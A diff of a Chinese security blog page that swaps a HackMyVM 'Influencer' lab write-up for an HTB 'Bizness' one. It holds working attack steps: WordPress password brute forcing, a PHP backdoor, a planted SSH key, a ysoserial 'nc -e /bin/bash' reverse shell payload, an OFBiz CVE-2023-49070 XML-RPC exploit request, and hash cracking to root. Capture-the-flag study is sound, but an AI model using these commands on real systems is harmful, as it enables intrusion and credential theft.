@@ -9,7 +9,7 @@
     
     <title>
         
-            hackmyvm influencer复盘 |
+            htb bizness复盘 |
         
         Flowww&#39;s blog
     </title>
@@ -191,7 +191,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        hackmyvm influencer复盘
+                        htb bizness复盘
                     </div>
                 
 
@@ -222,7 +222,7 @@
 
             <span class="meta-info-item post-update-date">
                 <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="datetime" data-updated="Fri Apr 05 2024 16:24:37 GMT+0800">2024-04-05</span>
+                <span class="datetime" data-updated="Sat Apr 06 2024 01:12:53 GMT+0800">2024-04-06</span>
             </span>
         
 
@@ -232,10 +232,10 @@
             <span class="post-tag meta-info-item border-box">
                 <ul class="post-tag-ul">
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/hackmyvm/">hackmyvm</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%A4%8D%E7%9B%98/">复盘</a></li>
                         
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%A4%8D%E7%9B%98/">复盘</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/htb/">htb</a></li>
                         
                     
                 </ul>
@@ -263,56 +263,49 @@
                 <div class="post-content keep-markdown-body">
                     
 
-                    <h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   target="_blank" rel="noopener" href="https://hackmyvm.eu/machines/machine.php?vm=Influencer" >https://hackmyvm.eu/machines/machine.php?vm=Influencer<i class="fas fa-external-link-alt"></i></a></p>
-<p>难度：medium</p>
-<p>ip：192.168.64.115(后变成116)</p>
-<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>nmap扫到2121端口（是ftp服务（和80端口</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405154528.png" ></p>
-<p>无密码连接ftp，有一个note.txt提示有个wordpress站点，还有很多张图片，用工具分析了图片，找到snapchat.jpg有隐藏信息</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405154710.png" ></p>
-<p>给了一串密码，还要看用户名</p>
-<p>看看80端口，到目录扫到&#x2F;wordpress，很容易就找到登录口，用wpscan扫描，扫到一个用户名luna，尝试用刚刚到密码登录，失败，rockyou.txt爆破也没有结果，然后就去站点本身看看</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405155202.png" ></p>
-<p>看到有关luna的个人信息，用社工工具生成一个字典</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-05%2015.54.55.png" ></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405155651.png" ></p>
-<p>然后用wpscan爆破出密码</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405155805.png" ></p>
-<p>成功爆破出来，登录后台</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405155939.png" ></p>
-<p>找到appearance-&gt;theme file editor，修改php文件，写入后门文件，本地开启监听</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160202.png" ></p>
-<p>成功拿到www-data的shell</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160255.png" ></p>
-<h4 id="userflag"><a href="#userflag" class="headerlink" title="userflag"></a>userflag</h4><p>ss -lntp查看开放了什么端口</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160424.png" ></p>
-<p>注意到有个1212端口，先用socat转发出去</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:4444,fork TCP:localhost:1212 &amp; </span><br></pre></td></tr></table></figure>
+                    <h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   target="_blank" rel="noopener" href="https://app.hackthebox.com/machines/Bizness" >https://app.hackthebox.com/machines/Bizness<i class="fas fa-external-link-alt"></i></a></p>
+<p>难度：easy</p>
+<p>IP：10.10.11.252</p>
+<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>端口扫描，扫到22 80 443 40081端口，先看80端口，需要配置hosts文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;10.10.11.252 bizness.htb&#x27; &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
 
-<p>然后访问4444端口</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160617.png" ></p>
-<p>看来是个ssh服务，那就用ssh连接，用最开始在图片里拿到的密码，成功登录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh luna@192.168.64.116 -p 4444</span><br><span class="line">密码：u3jkeg97gf</span><br></pre></td></tr></table></figure>
+<p>然后访问网页，翻到最下面发现是apache ofbiz</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405220345.png" ></p>
+<p>查询到有相关漏洞，反序列化命令执行漏洞 CVE-2023-49070，在网上找到<a class="link"   target="_blank" rel="noopener" href="https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Apache%20OfBiz%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2023-49070.md" >poc<i class="fas fa-external-link-alt"></i></a>，按照poc使用</p>
+<p>先下载ysoserial.jar生成base64的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 &#x27;nc -e /bin/bash 10.10.16.19 8888&#x27; | base64 | tr -d &quot;\n&quot;</span><br></pre></td></tr></table></figure>
 
-<p>然后使用sudo -l查到juan可以免密码执行exiftool</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160840.png" ></p>
-<p>再查询知道exiftool可以写文件，<strong>思路是在juan的.ssh目录下写一个authorized_keys</strong>,然后ssh连接登录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">luna@influencer:~$ cd /tmp</span><br><span class="line">luna@influencer:/tmp$ echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8pW4mmY4tPKfm6n1XBJldNxoo+ehIpzS1Y1kI32qU8fLVbraU85pjcPUK7pHcvoKfBl02hjpKhsTSHHG5iEsaCAMrD8euYDfNRKu0ITfX5EukM8JhDXEgWzGWlieF9KEB0haZJyFm6lIVPK950FtElXNZGagQ3wyQoVGRnoUhTlyeK5BcFbFlnMZdndOEB8TPOTzc13SpfCSU7lF4YckPjqgV1Y45kDEvJViv9xMPEd0be80F+lJ1J2/qywFTySfVlOqsFOzp3m3fLyUb80yk8Qs0BSR5q1NXexHXfCPwBbDW6vX4iygbSm1TRei2kre0CvsqUEgGipCmJTdkPQyr+ZFTZl/0DlSX07ZSrat9NAbXc+MfG5j0QsgebkjR4aWQxAym/yEfe7WGyOZdf43rxzS61dToq9CBrTQUapmwg6efBTwlEeMVA+fSK5bqxDvD1quCLoMrSonc7v4OKkopaB3hUfdM/YwGexHk7DLtsE50O80wMajhYy8aR4N4aI8= root@kali&#x27; &gt; abc</span><br><span class="line">luna@influencer:/tmp$ chmod 777 abc</span><br><span class="line">luna@influencer:/tmp$ sudo -u juan /usr/bin/exiftool -filename=/home/juan/.ssh/authorized_keys abc</span><br></pre></td></tr></table></figure>
+<p>然后发包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">GET /id</span><br><span class="line">webtools/control/xmlrpc;/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y HTTP/1.1</span><br><span class="line">Host: bizness.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=42ED2921E0C9B3F3BB49F2D2D2F4030A.jvm1; JSESSIONID=21613FA6F2D87CC9AF8B6AC6A4DF1FF7.jvm1; OFBiz.Visitor=10639</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Content-Length: 4157</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">  &lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;</span><br><span class="line">  &lt;params&gt;</span><br><span class="line">    &lt;param&gt;</span><br><span class="line">      &lt;value&gt;</span><br><span class="line">        &lt;struct&gt;</span><br><span class="line">          &lt;member&gt;</span><br><span class="line">            &lt;name&gt;test&lt;/name&gt;</span><br><span class="line">            &lt;value&gt;</span><br><span class="line">              &lt;serializable xmlns=&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;&gt;生成的paylpad&lt;/serializable&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">          &lt;/member&gt;</span><br><span class="line">        &lt;/struct&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/param&gt;</span><br><span class="line">  &lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure>
 
-<p>成功在本地登录</p>
-<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161301.png"   style="zoom:50%;" >
+<p>成功拿到第一个shell</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405222320.png" ></p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><strong>涉及的知识点没见过，记录一下</strong></p>
+<p>通过搜索，找到&#x2F;opt&#x2F;ofbiz&#x2F;runtime&#x2F;data&#x2F;derby&#x2F;ofbiz&#x2F;seg0目录下有很多.dat文件，<strong>derby是个小型数据库</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat * | grep -arin -o -E &#x27;(\w+\W+)&#123;0,5&#125;password(\W+\w+)&#123;0,5&#125;&#x27;</span><br></pre></td></tr></table></figure>
 
-<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>sudo -l查到是免密码执行一个脚本，脚本内容是给server.hmv发送请求</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161444.png" ></p>
-<p>然后查到&#x2F;etc&#x2F;hosts有写的权限，那么思路是修改&#x2F;etc&#x2F;hosts，<strong>把server.hmv的地址配置为自己kali的ip，开启apache服务并且在目录下新建一个98127651的文件</strong></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161658.png" ></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161859.png" ></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161931.png" ></p>
-<p>执行命令后再查看&#x2F;bin&#x2F;bash的权限</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405162027.png" ></p>
-<p>最后bash -p重新进入bash，提权成功</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405162119.png" ></p>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶场虽然是medium，但是思路都是比较常见的，感觉做完是在回顾前段时间学到的东西。涉及的知识点：wpscan扫描，爆破密码，社工工具生成字典，wordpress后台写入后门，socat端口转发，exiftool读写文件，&#x2F;etc&#x2F;hosts配置。</p>
+<ul>
+<li><code>(\w+\W+)&#123;0,5&#125;</code>：这是一个正则表达式，用于匹配最多五个字母&#x2F;数字和非字母&#x2F;数字字符的序列。<code>\w+</code> 匹配一个或多个字母&#x2F;数字字符，<code>\W+</code> 匹配一个或多个非字母&#x2F;数字字符，<code>&#123;0,5&#125;</code> 表示该序列最多重复匹配 0 到 5 次。</li>
+<li><code>password</code>：这是正则表达式中的一个具体词汇，表示要匹配的密码。</li>
+</ul>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-06%2000.02.23.png" ></p>
+<p>找到一串，Password&#x3D;”$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I” ，然后用cyberchef对后半段进行处理，解密成16进制的字符串</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406000552.png" ></p>
+<p>把_换成&#x2F;，把-换成+，再base64解码，最后转化到十六进制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashid -emj b8fd3f41a541a435857a8f3e751cc3a91c174362</span><br></pre></td></tr></table></figure>
+
+<p>使用hashid识别一下加密类型</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406001536.png" ></p>
+<p>猜测是120模式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 120 &quot;b8fd3f41a541a435857a8f3e751cc3a91c174362:d&quot; Desktop/rockyou.txt --show</span><br></pre></td></tr></table></figure>
+
+<p>爆出来的密码是monkeybizness</p>
+<p>然后直接su - root登录，权限就到root了</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406002249.png" ></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶机最后提取拿密码的思路之前没见过，学习了，然后apache那个反序列化漏洞实践poc的过程很有趣，htb的靶机质量真的可以。</p>
+<p>涉及知识点：poc利用，sha1加盐爆破，信息搜集（敏感数据库泄露），grep正则提取。</p>
+<h4 id="主要参考文章"><a href="#主要参考文章" class="headerlink" title="主要参考文章"></a>主要参考文章</h4><p><a class="link"   target="_blank" rel="noopener" href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackTheBox/Machines/Bizness/" >https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackTheBox/Machines/Bizness/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/gsh23/p/18087933" >https://www.cnblogs.com/gsh23/p/18087933<i class="fas fa-external-link-alt"></i></a></p>
 
                 </div>
                 
@@ -323,11 +316,11 @@
                             <ul class="post-tags-box border-box">
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/hackmyvm/">hackmyvm</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E5%A4%8D%E7%9B%98/">复盘</a>
                                     </li>
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E5%A4%8D%E7%9B%98/">复盘</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/htb/">htb</a>
                                     </li>
                                 
                             </ul>
@@ -343,31 +336,15 @@
                 
                     <div class="post-nav border-box">
                         
-                            <div class="prev-post">
-                                <a class="prev"
-                                   rel="prev"
-                                   href="/2024/04/05/htb-bizness%E5%A4%8D%E7%9B%98/"
-                                   title="htb bizness复盘"
-                                >
-                                    <span class="left arrow-icon flex-center">
-                                        <i class="fas fa-chevron-left"></i>
-                                    </span>
-                                    <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">htb bizness复盘</span>
-                                        <span class="post-nav-item">上一篇</span>
-                                    </span>
-                                </a>
-                            </div>
-                        
                         
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2024/04/05/htb-headless%E5%A4%8D%E7%9B%98/"
-                                   title="htb headless复盘"
+                                   href="/2024/04/05/hackmyvm-influencer%E5%A4%8D%E7%9B%98/"
+                                   title="hackmyvm influencer复盘"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">htb headless复盘</span>
+                                        <span class="post-nav-title-item text-ellipsis">hackmyvm influencer复盘</span>
                                         <span class="post-nav-item">下一篇</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
@@ -395,7 +372,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-number">1.</span> <span class="nav-text">靶机信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#userflag"><span class="nav-number">3.</span> <span class="nav-text">userflag</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-number">1.</span> <span class="nav-text">靶机信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">5.</span> <span class="nav-text">主要参考文章</span></a></li></ol>
     </div>
 </div>
 
@@ -558,7 +535,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-number">1.</span> <span class="nav-text">靶机信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#userflag"><span class="nav-number">3.</span> <span class="nav-text">userflag</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-number">1.</span> <span class="nav-text">靶机信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">5.</span> <span class="nav-text">主要参考文章</span></a></li></ol>
     </div>
 </div>
 
